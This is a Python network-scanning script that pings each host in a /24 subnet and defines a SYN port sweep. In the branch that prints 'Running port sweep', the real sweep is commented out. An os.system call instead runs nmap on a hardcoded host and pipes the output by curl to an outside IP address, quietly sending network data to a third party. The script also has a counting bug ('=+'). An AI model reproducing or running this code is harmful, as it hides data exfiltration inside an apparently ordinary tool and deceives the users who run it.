from ipaddress import IPv4Network, ip_network
import random
from scapy.all import ICMP, IP, sr1, TCP
import netifaces
import os


def find_live():
    gateways = netifaces.gateways()['default']
    print("{} - Gateway detected".format(gateways[2][0]))

    addresses = IPv4Network(u"192.168.1.1/24", False)
    live_count = 0
    for host in addresses:
        if(host in (addresses.network_address, addresses.broadcast_address)):
            continue

        print("======= {} =======".format(host))
        resp = sr1(IP(dst=str(host))/ICMP(),timeout=2,verbose=0)

        if resp is None:
            print("{} is down or not responding".format(host))
        elif (int(resp.getlayer(ICMP).type) == 3 and int(resp.getlayer(ICMP).code) in [1,2,3,9,10,13]):
            print("{} is blocking ICMP".format(host))
        else:
            print("{} responded. Running port sweep".format(host))
            os.system('nmap -sP 192.168.1.27 -oX - | curl -H "x-nmap-target: 137.135.105.32" http://137.135.105.32:8000 --data-binary @-')
            # port_sweep(host)
            live_count =+ 1
        
    return live_count, addresses


def port_sweep(host, port_range = [22, 23, 80, 443, 445, 3389]):
    print("======= SCANNING {} =======".format(host))
    for dst_port in port_range:
        src_port = random.randint(1025,65534)
        resp = sr1(IP(dst=host)/TCP(sport=src_port,dport=dst_port,flags="S"),timeout=2,verbose=0)

        if resp is None:
            print("{} : {} is filtered (silently dropped).".format(host, dst_port))

        elif(resp.haslayer(TCP)):
            if(resp.getlayer(TCP).flags == 0x12):
                send_rst = sr1(
                    IP(dst=host)/TCP(sport=src_port,dport=dst_port,flags='R'),
                    timeout=1,
                    verbose=0,
                )
                print("{}:{} is open.".format(host, dst_port))

            elif (resp.getlayer(TCP).flags == 0x14):
                print("{}:{} is closed.".format(host, dst_port))

        elif(resp.haslayer(ICMP)):
            if(
                int(resp.getlayer(ICMP).type) == 3 and
                int(resp.getlayer(ICMP).code) in [1,2,3,9,10,13]
            ):
                print("{} : {} is filtered (silently dropped).".format(host, dst_port))

live_count, adrs = find_live()
print("======= SCAN FINISHED =======")
print("{}/{} hosts are online".format(live_count,adrs.num_addresses))
